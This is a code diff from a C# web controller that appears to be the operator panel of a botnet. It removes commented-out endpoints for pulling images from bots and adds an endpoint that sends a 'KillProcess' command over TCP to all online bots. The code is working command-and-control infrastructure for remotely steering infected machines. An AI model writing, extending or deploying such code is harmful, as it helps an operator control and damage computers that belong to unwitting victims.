@@ -611,38 +611,31 @@ namespace Alduin.Web.Controllers
             var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
             return Json(response);
         }
-        /*[Authorize]
-        [HttpGet]
-        public async Task<IActionResult> GetAllImg(int botid)
-        {
-            var method = new BaseCommands
-            {
-                Method = "GetAllImgJson"
-            };
-            var bot = new GetBotByIdQuery
-            {
-                Id = botid
-            };
-            var botlist = await _mediator.Send(bot);
-            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(method));
-            return Json(response);
-        }*/
-        /*[Authorize]
+        [Authorize]
         [HttpPost]
-        public async Task<IActionResult> GetImg([FromBody] GetImgModel model)
+        public async Task<IActionResult> KillProcess(int procId)
         {
             var method = new BaseCommands
             {
-                Method = "GetImg"
+                Method = "KillProcess"
+            };
+            var Variables = new KillProcessVariables 
+            {
+                Id = procId
+            };
+            var Command = new KillProcessCommands
+            {
+                newVariables = Variables,
+                newBaseCommand = method,
             };
             var bots = new GetBotsByStatusQuery
             {
-                status = false
+                status = false//execute online bots
             };
             var botlist = await _mediator.Send(bots);
-            string response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(method).Replace(@"\", ""));
-            byte[] img = Encoding.ASCII.GetBytes(response);
-            return File(img, "image/jpg");
-        }*/
+            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
+            return Json(response);
+        }
+
     }
 }
